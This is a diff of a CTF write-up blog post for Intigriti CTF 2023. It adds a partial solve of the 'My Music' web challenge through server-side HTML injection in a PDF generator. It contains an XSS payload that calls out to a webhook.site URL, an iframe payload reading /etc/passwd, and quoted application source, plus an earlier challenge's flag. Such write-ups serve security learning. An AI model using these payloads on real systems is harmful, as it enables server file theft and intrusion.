@@ -31,7 +31,7 @@ How about if we try to insert single quote `'` instead? We got an error? Is ther
 
 ![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_5.png)
 
-Let's try put a custom query to make it correct query. 
+Let's try put a custom query to make it response with correct and wrong response. 
 
 **Correct Response**
 
@@ -81,7 +81,6 @@ def exploit_websockets(TARGET):
                     print(dumped)
                     i+=1
                     break
-            return
         
 if __name__ == "__main__":
     TARGET = "wss://bountyrepo.ctf.intigriti.io/ws"
@@ -130,3 +129,247 @@ And we get the flag!
 ![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_14.png)
 
 Flag : `INTIGRITI{w3b50ck37_5ql1_4nd_w34k_jw7}`
+
+## Web : My Music
+
+![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_15.png)
+
+I didn't managed to solve this challenge during the event but it's a good practice to solve an unsolved challenge after the event. Thanks to all of the writeup from others CTF players!
+
+We can see that there are **Login** and **Register** tabs at the top of the page
+
+![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_16.png)
+
+Let's try register an account first.
+
+![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_17.png)
+
+We have `login hash`, `update function` and `generate profile card` which could help us to look for vulnerability in this page.
+
+![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_18.png)
+
+The login page only receive the `login hash` to login. A valid hash will lead us to the home page of the user, while invalid hash will give us an error. Nothing much I manage to find in this login page, so let's move on to the update function. 
+
+**Invalid Login Hash**
+
+![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_19.png)
+
+The update function will send a `PUT` method to `/api/user` and there are three (3) parameters we can update in here.
+
+![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_20.png)
+
+The generate function will send a `POST` method to `/profile/generate-profile-card` and there is no parameter used and it needs the cookies `login_hash`
+
+![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_21.png)
+
+The PDF generated will have all the value of parameters `username,firstname,lastname,spotifyTrackCode`.
+
+![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_22.png)
+
+First thing come into my mind, is it a dynamic PDF generated? Will there be an injection related to server side? So mostly I referring in [here](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf?q=browse) while doing this challenge. So let's try insert html injection in all the parameters that we can update and generate again the PDF.
+
+```json
+{
+    "firstName":"<h1>firstName</h1>","lastName":"<h1>lastName</h1>","spotifyTrackCode":"<h1>spotifyTrackCode</h1>"
+}
+```
+
+![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_23.png)
+
+Nice, atleast one parameter `spotifyTrackCode` vulnerable to `HTML Injection`. But is it just a normal `HTML Injection`? Let's try insert one XSS that try request to our webhook.
+
+```cs
+<img src=x onerror=fetch('https://webhook.site/edf38419-6f01-4b60-aa0e-2428b2089bef') />
+```
+
+Nice we got a request!
+
+![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_24.png)
+
+So now we know that it involve with server side, let's use simple payload to read local file such as `/etc/passwd`
+
+```html
+<iframe src=file:///etc/passwd height=2000 width=800></iframe>
+```
+
+![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_25.png)
+
+So I tried to read almost all of the source code that I could find listed below:
+
+```cs
+/app/app.js 
+/app/package.json
+/app/routes/index.js 
+/app/routes/api.js 
+/app/views/register.handlebars
+/app/services/user.js
+/app/middleware/check_admin.js
+/app/middleware/auth.js
+/app/controllers/user.js
+/app/utils/generateProfileCard.js
+/app/views/print_profile.handlebars
+/app/data/{hash}.json
+/app/Dockerfile 
+/etc/resolv.conf
+```
+
+To get the flag, we need to access `/admin` with **JSON** body which impossible for us to update through the web UI.
+
+**routes/index.js**
+
+```js
+router.get('/admin', isAdmin, (req, res) => {
+    res.render('admin', { flag: process.env.FLAG || 'CTF{DUMMY}' })
+})
+```
+
+**middleware/check_admin.js**
+
+```js
+const { getUser, userExists } = require('../services/user')
+const isAdmin = (req, res, next) => {
+let loginHash = req.cookies['login_hash']
+let userData
+
+if (loginHash && userExists(loginHash)) {
+    userData = getUser(loginHash)
+} else {
+    return res.redirect('/login')
+}
+try {
+    userData = JSON.parse(userData)
+    if (userData.isAdmin !== true) {
+        res.status(403)
+        res.send('Only admins can view this page')
+        return
+    }
+} catch (e) {
+    console.log(e)
+}
+next()
+}
+
+module.exports = { isAdmin }
+```
+
+The function `getUser(loginHas)` will get us better understanding on what `userData.isAdmin` is checking.
+
+**services/user.js**
+
+```js
+const fs = require('fs')
+const path = require('path')
+const { createHash } = require('crypto')
+const { v4: uuidv4 } = require('uuid')
+const dataDir = './data'
+
+// Register New User
+// Write new data in  /app/data/<loginhash>.json
+const createUser = (userData) => {
+    const loginHash = createHash('sha256').update(uuidv4()).digest('hex')
+        fs.writeFileSync(
+            path.join(dataDir, `${loginHash}.json`),
+            JSON.stringify(userData)
+        )
+    return loginHash
+}
+
+// Update User
+// Update new data in  /app/data/<loginhash>.json
+const setUserData = (loginHash, userData) => {
+    if (!userExists(loginHash)) {
+        throw 'Invalid login hash'
+    }
+    fs.writeFileSync(
+        path.join(dataDir, `${path.basename(loginHash)}.json`),
+        JSON.stringify(userData)
+    )
+    return userData
+}
+
+// Get User
+// Read /app/data/<loginhash>.json
+const getUser = (loginHash) => {
+    let userData = fs.readFileSync(
+        path.join(dataDir, `${path.basename(loginHash)}.json`),
+        {
+        encoding: 'utf8',
+        }
+    )
+    return userData
+}
+
+// Check if UserExists
+// Check if file /app/data/<loginhash>.json exists
+const userExists = (loginHash) => {
+    return fs.existsSync(path.join(dataDir, `${path.basename(loginHash)}.json`))
+}
+```
+
+So `getUser()` will get us the `JSON` value of our user which will holds parameters such as `username, firstName, ` as shown inside the codes below.
+
+**controllers/user.js**
+
+```js
+...
+// Create User only accepts username, firstName, lastName
+// There is no isAdmin available in here
+const { username, firstName, lastName } = req.body
+const userData = {
+    username,
+    firstName,
+    lastName,
+}
+try {
+    const loginHash = createUser(userData)
+...
+// Update user only accepts firstname, lastname, spotifyTrackCode
+// Also there is no isAdmin available in here
+const { firstName, lastName, spotifyTrackCode } = req.body
+const userData = {
+    username: req.userData.username,
+    firstName,
+    lastName,
+    spotifyTrackCode,
+}
+try {
+    setUserData(req.loginHash, userData)
+...
+```
+
+One idea, that I had was to find a way to write the **JSON** payload with **isAdmin** into `/app/data` and use the cookies `login_hash` to load the **.json** file. Interestingly, inside the PDF generator function located in `utils/generateProfileCard.js`, there is a request body that we can send to add options into puppeteer pdf.
+
+**routes/index.js**
+
+```js
+// We can send userOptions in the body
+router.post('/profile/generate-profile-card', requireAuth, async (req, res) => {
+    const pdf = await generatePDF(req.userData, req.body.userOptions)
+    res.contentType('application/pdf')
+    res.send(pdf)
+})
+```
+
+**utils/generateProfileCard.js**
+
+```js
+...
+const generatePDF = async (userData, userOptions) => {
+    const browser = await puppeteer.launch({
+        executablePath: '/usr/bin/google-chrome',
+        args: ['--no-sandbox'],
+    })
+    const page = await browser.newPage()
+    ...
+    let options = {
+    format: 'A5',
+    }
+    // Our userOptions will be use to generate the PDF
+    if (userOptions) {
+        options = { ...options, ...userOptions }
+    }
+    const pdf = await page.pdf(options)
+    ...
+}
+...
+```
